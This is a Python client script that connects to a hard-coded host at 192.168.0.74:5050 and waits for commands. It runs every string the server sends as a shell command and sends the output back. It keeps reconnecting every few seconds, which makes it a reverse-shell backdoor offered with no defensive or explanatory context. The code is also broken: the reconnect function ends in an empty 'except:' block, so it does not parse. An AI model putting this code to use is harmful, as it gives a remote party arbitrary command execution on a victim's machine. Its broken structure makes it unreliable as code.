import subprocess
import socket, os, time, threading

HEADER = 64
PORT = 5050
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = "!DISCONNECT"
SERVER = "192.168.0.74"
ADDR = (SERVER, PORT)
connected = True
DEBUG = True
DEBUG_V = True
firstConnect = True
startThread = True
stop_threads = False

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m' 
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    
    
def is_socket_closed(sock: socket.socket) -> bool:
    
    global DEBUG
    try:
        # this will try to read bytes without blocking and also without removing them from buffer (peek only)
        data = sock.recv(16, socket.MSG_DONTWAIT | socket.MSG_PEEK)
        if len(data) == 0:
            return True
    except BlockingIOError:
        return False  # socket is open and reading from it would block
    except ConnectionResetError:
        return True  # socket was closed for some other reason
    except BrokenPipeError:
      return True # Server Closed
    except Exception as e:
        if "[Errno 107] Transport endpoint is not connected" in str(e):
          return True
        else:
          if DEBUG_V:
            f = open('error.txt', 'a')
            print(e)
            f.write(str(e))
            f.close()
            
          return False
    return False
  
  
def send(msg):
    global stop_threads
    try:
      message = msg.encode(FORMAT)
    except:
      message = msg
    try:
      msg_length = len(message)
      send_length = str(msg_length).encode(FORMAT)
      send_length += b' ' * (HEADER - len(send_length))
      client.send(send_length)
      try:
       client.send(bytes(message))
      except:
       client.send(message)
    except BrokenPipeError:
      reconnect()
      
      
    
      
      
def control():
  global client
  global stop_threads
  global DEBUG
  while True:
    
    if stop_threads:
            break
    
    try:
      bashCommand = client.recv(2048).decode(FORMAT)
      
  
      #print('1')
      try:
        proc = subprocess.Popen([bashCommand], stdout=subprocess.PIPE, shell=True)
        #print('2')
        (out, err) = proc.communicate()
        #print('3')
  
        send(out)
        if err:
         send(err)
        #print('4')
        send(f'{bcolors.OKGREEN}[OK] command ran{bcolors.ENDC}')
      except:
        send(f'{bcolors.FAIL}[ERROR] Unable to run command, bad command{bcolors.ENDC}')
    except:
      send(f'{bcolors.FAIL}[ERROR] Unable to run command{bcolors.ENDC}')

def reconnect():
  global startThread
  global client
  global stop_threads
  if DEBUG:
    print(f'{bcolors.WARNING}[WARN] Recconect Triggered{bcolors.ENDC}')
  while is_socket_closed(client) is False:
      
      if startThread == True:
          thread2 = threading.Thread(target=control)
          thread2.start()
          startThread = False

  while is_socket_closed(client) is True:
        time.sleep(5)
        if DEBUG:
         print(f'{bcolors.WARNING}[WARN] Trying to reconnect{bcolors.ENDC}')
        
        stop_threads = True
        startThread = True
        
        try:
          client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          client.connect(ADDR)
          
          if DEBUG:
            print(f'{bcolors.OKGREEN}[CONNECTED] Connected to host{bcolors.ENDC}')
            
          
        except:
while True:
    try: 
      if firstConnect == True:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect(ADDR)
        
        if DEBUG:
          print(f'{bcolors.OKGREEN}[CONNECTED] Connected to host{bcolors.ENDC}')
      firstConnect = False
      while is_socket_closed(client) is False:
        if startThread == True:
          thread2 = threading.Thread(target=control)
          thread2.start()
          startThread = False
      
        
        
      
    except socket.error:
      if DEBUG:
        print(f'{bcolors.FAIL}[ERROR] unable to connect to host{bcolors.ENDC}')
      time.sleep(3)
      if DEBUG:
        print(f'{bcolors.WARNING}[RETRYING] Retrying to connect to host,{bcolors.ENDC}')
      time.sleep(0.5)
      
    


  

  

send(DISCONNECT_MESSAGE)


